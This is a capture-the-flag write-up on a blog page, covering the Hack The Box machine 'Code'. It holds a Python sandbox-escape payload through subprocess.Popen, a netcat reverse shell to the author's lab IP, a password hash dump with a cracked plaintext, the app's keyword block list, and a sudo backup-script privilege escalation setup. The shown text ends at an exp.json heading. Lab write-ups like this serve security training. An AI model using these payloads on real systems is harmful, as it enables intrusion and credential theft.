@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/03/24/hackthebox/htb-code/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HTB-Code | Muyi&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muyi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">37</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HTB-Code</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-24 15:02:33</span>
+        <span class="mobile">2025-03-24 15:02:33</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-17 13:10:03</span>
+            <span class="mobile">2025-08-17 13:10:03</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Easy/">Easy</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Linux/">Linux</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>nmap</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:<span class="built_in">df</span>:51:a2:7a:bd (RSA)</span><br><span class="line">|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)</span><br><span class="line">|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)</span><br><span class="line">5000/tcp open  http    Gunicorn 20.0.4</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 1723/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   125.62 ms 10.10.16.1</span><br><span class="line">2   154.62 ms code.htb (10.10.11.62)</span><br></pre></td></tr></table></figure></div>
+
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machine$ whatweb http://<span class="variable">$ip</span>:5000</span><br><span class="line">http://10.10.11.62:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn/20.0.4], IP[10.10.11.62], JQuery[3.6.0], Script, Title[Python Code Editor]</span><br></pre></td></tr></table></figure></div>
+
+<p>Port 5000 is hosting a website</p>
+<ul>
+<li>a web-based python compiler</li>
+<li>using gunicorn version 20.0.4</li>
+<li>has a custom regex rule to block dangerous keywords such as (“os”)</li>
+<li>pyjail</li>
+</ul>
+<p>Enumerating in-memory subclassess</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inj=<span class="string">&#x27;for i, c in enumerate((()).__class__.__base__.__subclasses__()): print(i, c)&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -X POST <span class="string">&quot;http://<span class="variable">$ip</span>:5000/run_code&quot;</span> --data-urlencode <span class="string">&quot;code=<span class="variable">$inj</span>&quot;</span> &gt;&gt; subclassess.txt</span><br></pre></td></tr></table></figure></div>
+<p>Output:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/code~10.10.11.62$ <span class="built_in">cat</span> subclassess.txt | sed <span class="string">&#x27;s/\\n/\n/g&#x27;</span> | grep -C 3 -i popen</span><br><span class="line">[...]</span><br><span class="line">317 &lt;class <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>the memory index to be used is 317 [Popen]</li>
+</ul>
+<p>Final Payload</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">317</span>](<span class="string">&quot;cat /etc/passwd&quot;</span>, shell=<span class="literal">True</span>, stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>])</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>discover user martin &amp; app-production</li>
+<li>further enumeration returns that the app-production is the one in charge of the website [whoami]</li>
+</ul>
+<p>Using the payload, craft a reverse shell</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">317</span>](<span class="string">&quot;busybox nc 10.10.16.28 9999 -e sh&quot;</span>,shell=<span class="literal">True</span>, stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>])</span><br></pre></td></tr></table></figure></div>
+
+<p>On the listener</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app-production@code:~/app$ <span class="built_in">whoami</span></span><br><span class="line">app-production</span><br></pre></td></tr></table></figure></div>
+
+<p>Inside app.py [Restriction]</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> keyword <span class="keyword">in</span> [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> keyword <span class="keyword">in</span> code.lower():</span><br><span class="line">                <span class="built_in">return</span> jsonify(&#123;<span class="string">&#x27;output&#x27;</span>: <span class="string">&#x27;Use of restricted keywords is not allowed.&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>Inside the app directory, contains a database.db</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app-production@code:~/app$ <span class="built_in">ls</span> *</span><br><span class="line">app.py</span><br><span class="line"></span><br><span class="line">instance:</span><br><span class="line">database.db</span><br><span class="line"></span><br><span class="line">__pycache__:</span><br><span class="line">app.cpython-38.pyc</span><br><span class="line"></span><br><span class="line">static:</span><br><span class="line">css</span><br><span class="line"></span><br><span class="line">templates:</span><br><span class="line">about.html  codes.html  index.html  login.html  register.html</span><br></pre></td></tr></table></figure></div>
+
+<p>Download it and using sqlite3 to examine the database</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/code~10.10.11.62$ sqlite3 database.db</span><br><span class="line">SQLite version 3.46.1 2024-08-13 09:16:08</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">code  user</span><br><span class="line">sqlite&gt; <span class="keyword">select</span> * from user</span><br><span class="line">   ...&gt; ;</span><br><span class="line">1|development|759b74ce43947f5f4c91aeddc3e5bad3</span><br><span class="line">2|martin|3de6f30c4a09c27fc71932bfc68474be</span><br><span class="line">3|wy|dfcc9dca8ed7aa668e1dcc2996455191</span><br></pre></td></tr></table></figure></div>
+
+<p>crack the hash for user martin</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/code~10.10.11.62$ hashcat -m 0 3de6f30c4a09c27fc71932bfc68474be /usr/share/wordlists/ro</span><br><span class="line">ckyou.txt.gz</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></div>
+
+<p>SSH into martin and pwn martin</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">martin@code:~$ <span class="built_in">whoami</span></span><br><span class="line">martin</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Priv-Esc"><a href="#Priv-Esc" class="headerlink" title="Priv Esc"></a>Priv Esc</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">martin@code:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> martin on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User martin may run the following commands on localhost:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>backy.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$#</span> -ne 1 ]]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;task.json&gt;&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">json_file=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ ! -f <span class="string">&quot;<span class="variable">$json_file</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Error: File &#x27;<span class="variable">$json_file</span>&#x27; not found.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">allowed_paths=(<span class="string">&quot;/var/&quot;</span> <span class="string">&quot;/home/&quot;</span>)</span><br><span class="line"></span><br><span class="line">updated_json=$(/usr/bin/jq <span class="string">&#x27;.directories_to_archive |= map(gsub(&quot;\\.\\./&quot;; &quot;&quot;))&#x27;</span> <span class="string">&quot;<span class="variable">$json_file</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">/usr/bin/echo <span class="string">&quot;<span class="variable">$updated_json</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$json_file</span>&quot;</span></span><br><span class="line"></span><br><span class="line">directories_to_archive=$(/usr/bin/echo <span class="string">&quot;<span class="variable">$updated_json</span>&quot;</span> | /usr/bin/jq -r <span class="string">&#x27;.directories_to_archive[]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">is_allowed_path</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> path=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> allowed_path <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;allowed_paths[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$path</span>&quot;</span> == <span class="variable">$allowed_path</span>* ]]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">return</span> 0</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">return</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> <span class="variable">$directories_to_archive</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> ! is_allowed_path <span class="string">&quot;<span class="variable">$dir</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        /usr/bin/echo <span class="string">&quot;Error: <span class="variable">$dir</span> is not allowed. Only directories under /var/ and /home/ are allowed.&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">/usr/bin/backy <span class="string">&quot;<span class="variable">$json_file</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+
+<p>exp.json</p>
